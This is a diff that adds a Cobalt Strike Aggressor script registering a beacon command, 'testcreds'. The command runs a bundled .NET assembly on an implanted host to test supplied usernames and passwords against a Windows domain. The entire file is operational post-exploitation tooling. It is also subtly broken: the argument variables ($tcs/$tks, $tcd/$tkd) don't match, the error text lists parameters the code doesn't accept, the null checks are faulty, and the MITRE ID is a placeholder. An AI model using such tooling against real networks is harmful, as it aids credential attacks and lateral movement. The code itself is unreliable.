@@ -1,0 +1,155 @@
+#	ALIAS:	TESTCREDS
+
+# testcreds: Supporting Function(s)
+sub funct_testcreds_argparse {
+	global('$safety');
+	@param = @('-s','-d','-u', '-p');
+	if (iff($2 in @param, true, false)) {
+		if ($2 eq '-s') {
+			return %(idx => '1', arg => $3);
+		}
+		else if ($2 eq '-d') {
+			return %(idx => '2', arg => $3);
+		}
+		else if ($2 eq '-u') {
+			return %(idx => '3', arg => $3);
+		}
+		else if ($2 eq '-p') {
+			return %(idx => '4', arg => $3);
+		}
+	}
+	else {
+		berror($1, "Not a valid Parameter \($2\): Allowed Parameters: -s, -c, -a");
+		$safety = "False";
+		return;
+	}
+}
+
+alias("assembly testcreds", {
+
+		local('$bid %arg1 %arg2 %arg3 %arg4');
+		global('@params $tcs $tcd $tcu $tcp $tcargs $safety');
+		clear(@params);
+		$safety = "True";
+
+		# Check for Number of Arguements
+		if (size(@_) < 8) {
+			berror($1, "testcreds: Not enough Parameters/Arguements supplied");
+			beacon_command_detail("testcreds");
+			return;
+		}
+		else if (size(@_) > 10) {
+			berror($1, "testcreds: Too many Parameters/Arguements supplied");
+			beacon_command_detail("testcreds");
+			return;
+		}
+		else if (size(@_) >= 8) {
+			if (iff("-d" in @_ && "-u" in @_ && "-p" in @_, false, true)) {
+				berror($1, "testcreds: '-d', '-u', '-p' are required parameters");
+				beacon_command_detail("testcreds");
+				return;
+			}
+
+		}
+		
+		# Task
+		try {
+			
+			# Print Information to Beacon Console.
+			binput($1, "[ Testing Credentials against Domain ]");
+			
+			# Parse Arguements
+			%arg1 = funct_testcreds_argparse($1, $3, $4);
+			push(@params, %arg1);
+			
+
+			%arg2 = funct_testcreds_argparse($1, $5, $6);
+			push(@params, %arg2);
+
+			%arg3 = funct_testcreds_argparse($1, $7, $8);
+			push(@params, %arg3);
+
+			if ($9 ne $null || $10 ne $null) {
+				%arg4 = funct_testcreds_argparse($1, $9, $10);
+				push(@params, %arg4);
+			}
+
+			if ($safety !eq "False") {
+			
+				# Beginning Task
+				btask($1, "Testing Credentials against Domain (MITRE ATTACK ID)", "T000");
+				
+				# Log Tasking to Event Log.
+				elog("\cC[+] Testing Credentials against Domain on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+			
+				sort({ return $1['idx'] <=> $2['idx'];}, @params);
+				
+				foreach $argument (@params) {
+					if ($argument['idx'] eq '1'){
+						if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+							$tcs = $argument['arg'];
+						}
+					}
+					else if ($argument['idx'] eq '2'){
+						$tkd = $argument['arg'];
+					}
+					else if ($argument['idx'] eq '3'){
+						$tku = $argument['arg'];
+					}
+					else if ($argument['idx'] eq '4'){
+						$tkp = $argument['arg'];
+					}
+				}
+				
+				# Main Code
+				# Create_Process <system> <command> <args>
+				if ($tks ne "" || $tks ne $null) {
+					$tcargs = "/S " . $tks . " " . $tkd . " " . $tku . " " . $tkp;
+				}
+				else {
+					$tcargs = $tkd . " " . $tku . " " . $tkp;
+				}
+
+				if (-is64 $1) {
+					if ("x86" !isin beacon_info($1, "barch")) {
+						bexecute_assembly($1, script_resource("_assemblies/testcreds/testcreds_x64_4.0.30319.exe"), $tcargs);
+					}
+					else {
+						bexecute_assembly($1, script_resource("_assemblies/testcreds/testcreds_x86_4.0.30319.exe"), $tcargs);
+					}
+				}
+				else{
+					bexecute_assembly($1, script_resource("_assemblies/testcreds/testcreds_x86_4.0.30319.exe"), $tcargs);
+				}
+				
+				# Print Information to Script Console.
+				println(
+					"\nPRINTED INFORMATION: TESTCREDS => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+					. "\nTesting Credentials against Domain."
+				);
+				# Task Complete
+
+			}
+
+		}
+		catch $exception {
+			
+			#Print Error to Script Console.
+			println(
+				"\nERROR INFORMATION: TESTCREDS => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nTESTCREDS: " . $exception
+			);
+			
+			# Print Error and Return.
+			berror($1, "TESTCREDS: " . $exception);
+			return;
+		}
+	}
+);
+
+#	ALIAS REGISTER: TESTCREDS
+beacon_command_register(
+	"assembly testcreds",
+	"\cD" . "[*] .NET \(4.0\): Tests credentials against domain" . "\o",
+	"Synopsis: testcreds [-s <server>] -d <domain> -u <username> -p <password>\n\nTests credentials against domain."
+ );
